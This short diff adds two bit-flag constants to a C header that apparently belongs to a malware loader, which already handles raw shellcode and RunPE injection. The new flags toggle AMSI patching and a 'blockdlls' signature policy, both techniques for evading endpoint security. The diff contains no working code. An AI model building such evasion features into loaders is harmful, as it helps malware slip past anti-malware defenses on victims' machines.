@@ -52,4 +52,11 @@
  * -------------------------------------------------------------------------- */
 #define PAYLOAD_FLAG_IS_SHELLCODE    (1u << 17)  /* raw PIC shellcode, skip RunPE    */
 
+/* ── Runtime OPSEC flags (bits 18–19) ────────────────────────────────────── */
+#define OPSEC_FLAG_NO_AMSI       (1u << 18)  /* skip Opsec_PatchAmsi() — patch is    */
+                                             /* applied only when amsi.dll is        */
+                                             /* already mapped in the process        */
+#define OPSEC_FLAG_NO_BLOCKDLLS  (1u << 19)  /* skip SetProcessMitigationPolicy(     */
+                                             /* ProcessSignaturePolicy, MS-signed)   */
+
 #endif /* OPSEC_FLAGS_H */
